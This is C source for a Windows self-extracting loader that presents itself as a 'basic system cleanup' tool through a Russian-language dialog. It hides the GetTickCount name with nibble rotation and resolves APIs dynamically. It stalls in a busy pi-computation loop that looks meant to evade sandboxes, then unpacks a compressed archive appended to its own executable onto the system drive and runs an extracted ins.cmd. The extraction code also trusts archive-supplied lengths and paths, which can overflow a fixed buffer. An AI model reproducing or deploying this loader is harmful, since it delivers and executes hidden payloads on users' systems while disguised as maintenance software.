#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <time.h>
#include <windows.h>

typedef DWORD (WINAPI *TFN)(VOID);
typedef DWORD (WINAPI *MSGA)(HWND,LPCSTR,LPCSTR,UINT);

#define LZ_BUF_SIZE 259
#define LZ_CAPACITY 24
#define LZ_MIN_MATCH 3

uint8_t flags;
uint8_t cbuffer[LZ_CAPACITY+1];
uint8_t vocbuf[0x10000];
uint32_t frequency[257];
uint16_t buf_size;
uint16_t vocroot;
uint16_t offset;
uint16_t lenght;
uint16_t symbol;
uint32_t low;
uint32_t hlp;
uint32_t range;
uint32_t *fc;
char *lowp;
char *hlpp;
uint8_t *cpos;
uint8_t rle_flag;

void pack_initialize(FILE *ifile){
  buf_size=flags=vocroot=*cbuffer=low=hlp=lenght=rle_flag=0;
  range=0xffffffff;
  lowp=&((char *)&low)[3];
  hlpp=&((char *)&hlp)[0];
  fc=&frequency[256];
  uint32_t i;
  for(i=0;i<257;i++) frequency[i]=i;
  for(i=0;i<0x10000;i++) vocbuf[i]=-1;
  cpos=cbuffer;
  if(!hlp){
    for(i=0;i<sizeof(uint32_t);i++){
      hlp<<=8;
      *hlpp=fgetc(ifile);
      if(ferror(ifile)||feof(ifile)) return;
    }
  };
}

void rc32_rescale(){
  uint16_t i;
  low+=frequency[symbol]*range;
  range*=frequency[symbol+1]-frequency[symbol];
  for(i=symbol+1;i<257;i++) frequency[i]++;
  if(*fc>0xffff){
    frequency[0]>>=1;
    for(i=1;i<257;i++){
      frequency[i]>>=1;
      if(frequency[i]<=frequency[i-1])
        frequency[i]=frequency[i-1]+1;
    };
  };
}

int rc32_read(uint8_t *buf,int l,FILE *ifile){
  while(l--){
    while((range<0x10000)||(hlp<low)){
      if(((low&0xff0000)==0xff0000)&&(range+(uint16_t)low>=0x10000))
        range=0x10000-(uint16_t)low;
      hlp<<=8;
      *hlpp=fgetc(ifile);
      if(ferror(ifile)) return -1;
      if(feof(ifile)) return 1;
      low<<=8;
      range<<=8;
    };
    range/=*fc;
    uint32_t count=(hlp-low)/range;
    if(count>=*fc) return -1;
    for(symbol=255;frequency[symbol]>count;symbol--) if(!symbol) break;
    *buf=(uint8_t)symbol;
    rc32_rescale();
    buf++;
  };
  return 1;
}

int unpack_file(FILE *ifile){
  uint16_t i;
  if(lenght){
    if(!rle_flag){
      symbol=vocbuf[offset++];
      vocbuf[vocroot++]=symbol;
    };
    lenght--;
  }
  else{
    if(!flags){
      cpos=cbuffer;
      if(rc32_read(cpos++,1,ifile)<0) return -1;
      flags=8;
      lenght=0;
      symbol=*cbuffer;
      for(i=0;i<flags;i++){
        if(symbol&0x80) lenght++;
        else lenght+=3;
        symbol<<=1;
      };
      if(rc32_read(cpos,lenght,ifile)<0) return -1;
    };
    lenght=0;
    if(*cbuffer&0x80){
      symbol=*cpos;
      vocbuf[vocroot++]=*cpos;
    }
    else{
      lenght=*cpos++;
      lenght+=LZ_MIN_MATCH+1;
      offset=*(uint16_t*)cpos++;
      if(offset==0xffff) return 0;
      if(offset>0xfefe){
        rle_flag=1;
        symbol=offset-0xfeff;
        for(i=0;i<lenght;i++) vocbuf[vocroot++]=symbol;
        lenght--;
      }
      else{
        rle_flag=0;
        offset+=(uint16_t)(vocroot+LZ_BUF_SIZE);
        symbol=vocbuf[offset++];
        vocbuf[vocroot++]=symbol;
        lenght--;
      };
    };
    *cbuffer<<=1;
    cpos++;
    flags--;
  };
  return 1;
}

void rmkdir(char *path,int depth){
  for(int i=depth;i<strlen(path);i++){
    if(path[i]=='/'){
      path[i]=0;
      if(access(path,0)!=0){
#ifndef _WIN32
        mkdir(path,0755);
#else
        mkdir(path);
#endif
        if(access(path,0)!=0) return;
      };
      path[i]='/';
      depth=i+1;
      rmkdir(path,depth);
      break;
    };
  };
  return;
}

void set_read_pointer(FILE *f){
  uint32_t maxpointer=0,size,SizeOfRawData,PointerToRawData;
  uint16_t number_of_sections;
  fseek(f,60,SEEK_SET);
  fread((char *)&size,1,4,f);
  fseek(f,size+6,SEEK_SET);
  fread((char *)&number_of_sections,1,2,f);
  fseek(f,0x100,SEEK_CUR);
  while(number_of_sections--){
    fread((char *)(&SizeOfRawData),1,sizeof(uint32_t),f);
    fread((char *)(&PointerToRawData),1,sizeof(uint32_t),f);
    if(PointerToRawData>maxpointer){
      maxpointer=PointerToRawData;
      size=PointerToRawData+SizeOfRawData;
    }
    fseek(f,32,SEEK_CUR);
  };
  fseek(f,size,SEEK_SET);
}

void unarc(char *out,char *fn){
  FILE *f=fopen(fn,"rb");
  set_read_pointer(f);
  pack_initialize(f);
  int i;
  uint32_t fl;
  char *t;
  char fp[257];
  char s;
  uint32_t fs;
  while(1){
    t=(char *)&fl;
    for(i=0;i<sizeof(uint32_t);i++){
      if(unpack_file(f)<0) return;
      if(offset==0xffff) return;
      t[i]=symbol;
    };
    if(feof(f)) break;
    for(i=0;i<strlen(out);i++){
      fp[i]=out[i];
    };
    fp[i++]='/';
    for(i=0;i<fl;i++){
      if(unpack_file(f)<0) return;
      fp[i+strlen(out)+1]=symbol;
    };
    fp[i+strlen(out)+1]=0;
    t=(char *)&fs;
    for(i=0;i<sizeof(uint32_t);i++){
      if(unpack_file(f)<0) return;
      t[i]=symbol;
    };
    rmkdir(fp,0);
    FILE *o=fopen(fp,"wb");
    for(i=0;i<fs;i++){
      if(unpack_file(f)<0) return;
      s=symbol;
      if(o) fputc(s,o);
    };
    if(o) fclose(o);
  };
  fclose(f);
}

void pi(uint32_t t){
  double p=0.0;
  double s=1.0;
  for(uint32_t i=0; i<t; i++){
    double k=8.0*i;
    p+=(4.0/(k+1)-2.0/(k+4)-1.0/(k+5)-1.0/(k+6))/s;
    s*=16.0;
  };
}

#define rot(c) (uint8_t)(((c<<4)&0xf0)|((c>>4)&0x0f))

void wait_pi(){
  uint32_t offsets[]={1009,3109,9109,12109,24107,48109,96053};
  uint32_t i=0;
  char fn[13],fs[]={0x74,0x56,0x47,0x45,0x96,0x36,0xb6,0x34,0xf6,0x57,0xe6,0x47,0x00}; //"GetTickCount"
  for(i=0;i<13;i++) fn[i]=rot(fs[i]);
  i=0;
  TFN tfn=(TFN)GetProcAddress(GetModuleHandle("Kernel32.dll"),fn);
  srand(tfn());
  uint32_t t=rand()%10+10,start,stop;
  start=tfn();
  stop=start;
  while((stop-start)/1000<t){
    pi(offsets[i]);
    i=(i+1)%7;
    stop=tfn();
  };
}

int main(int argc,char *argv[]){
  char path[257];
  MSGA msga=(MSGA)GetProcAddress(LoadLibrary("User32.dll"),"MessageBoxA");
  if(msga(NULL,"Произвести базовую очистку системы?","Внимание!",0x00001034)==6){
    wait_pi();
    sprintf(path,"%s/",getenv("SYSTEMDRIVE"));
    unarc(path,argv[0]);
    system("%SYSTEMDRIVE%/fixes/ins.cmd");
  };
  return 0;
}
